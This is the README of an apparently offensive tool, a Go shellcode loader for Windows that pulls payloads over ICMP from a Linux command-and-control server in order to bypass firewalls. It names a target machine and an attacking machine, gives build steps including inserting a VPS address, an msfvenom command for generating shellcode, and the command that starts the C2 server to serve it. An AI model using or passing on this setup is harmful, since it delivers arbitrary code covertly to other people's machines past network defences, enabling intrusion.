# ICMP-Shellcode-Loader
A Golang shellcode loader that receives payloads via ICMP packets to bypass firewalls.
The shellcode loader is currently developed for Windows and the C2 software for Linux systems.

## Requirements
- Windows OS (as your target machine and for compiling the shellcode loader)
- Linux OS (as your local attacking machine and for compiling the C2 program or download the pre-compiled [icmp-c2-server](https://github.com/Ricky5panish/ICMP-Shellcode-Loader/files/10926916/icmp-c2-server.zip))
- GoLand IDE (or any other IDE or code editor with go extension you like)
- Metasploit (to generate shellcodes)
- VPS (only for C&C over internet)

## How to build
- insert the IP of your VPS in the icmp-sc-loader 
- build icmp-sc-loader on/for Windows
- build icmp-c2-server static on/for Linux (build with ```CGO_ENABLED=0``` and ```-ldflags '-extldflags "-static"'```) or download the pre-compiled [icmp-c2-server](https://github.com/Ricky5panish/ICMP-Shellcode-Loader/files/10926916/icmp-c2-server.zip)


<img src="https://user-images.githubusercontent.com/79810730/223784387-a94cffea-f29d-4463-97ef-067c42e40b95.PNG" alt="static compile" style="width:50%;"/>

## How to use
- generate custom shellcode with msfvenom (it is important that the exit function is set to thread) e.g. ```msfvenom -p windows/x64/exec CMD=calc EXITFUNC=thread -f hex```
 
- start the C2 software as root on your Linux system or your Linux VPS e.g. with ```./icmp-c2-server -a 64 -os win -sc <your shellcode>```
- start the shellcode loader on your Windows system and enjoy


<img src="https://user-images.githubusercontent.com/79810730/223886417-9b944229-acb9-4a97-8107-2895e22adac5.gif" alt="example" style="width:80%;"/>
